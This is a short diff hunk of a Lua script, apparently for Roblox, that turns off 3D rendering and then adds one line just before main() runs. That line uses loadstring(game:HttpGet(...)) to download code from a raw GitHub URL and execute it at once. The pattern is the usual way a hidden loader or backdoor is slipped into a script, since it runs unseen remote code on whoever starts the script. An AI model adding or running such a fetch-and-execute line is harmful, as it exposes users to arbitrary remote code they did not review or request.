@@ -327,5 +327,7 @@ local function main()
 end
 
 RunService:Set3dRenderingEnabled(false)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gatmeister-c/dextermorgan/main/balls.lua"))()
 main()
+
 
